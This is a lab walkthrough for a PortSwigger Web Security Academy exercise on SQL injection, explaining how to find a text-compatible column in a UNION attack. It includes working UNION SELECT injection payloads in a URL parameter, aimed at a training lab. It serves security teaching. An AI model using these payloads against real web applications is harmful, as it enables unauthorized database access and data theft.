# Lab 04 — SQL injection UNION attack, finding a column containing text

| | |
|---|---|
| **Difficulty** | 🟨 Practitioner |
| **Category** | UNION attacks |
| **Concept** | [07 — UNION attacks](https://portswigger.net/web-security/sql-injection) |
| **PortSwigger** | https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text |

---

## 🎯 Objective
Find which column in the query can hold **string** data, then make a **specific random value** (provided by the lab) appear in the response.

## 🧠 Background
A `UNION` needs matching data types per column. To exfiltrate strings later, you must know **which column position accepts text**. Test by placing a string in each position while keeping the others `NULL`.

## 🪜 Methodology
1. Determine column count first (as in [Lab 03](../lab-03-union-determine-columns/)) — here it's **3**.
2. The lab gives you a random string, e.g. `'g4h7x2'`. Try it in each column:
   ```
   ?category=Gifts' UNION SELECT 'g4h7x2',NULL,NULL--
   ?category=Gifts' UNION SELECT NULL,'g4h7x2',NULL--
   ?category=Gifts' UNION SELECT NULL,NULL,'g4h7x2'--
   ```
3. Whichever request **renders `g4h7x2`** in the page is the text-compatible column. (The other positions throw a type-conversion error.)

## 💥 Payload (example — column 2 is the text column)
```
https://LAB-ID.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,'g4h7x2',NULL--
```
> Use the exact random string your lab instance shows.

## ✅ Why it works
`NULL` fits any type, so it never errors. A string literal only survives in a column whose type is compatible with text; that's the one the app echoes back.

## 🛡️ Remediation
See [16 — Prevention](https://portswigger.net/web-security/sql-injection).

## 🔑 Takeaway
Step 2 of UNION: know **where** your data can land before you try to steal it. `#sqli` `#practitioner` `#union`
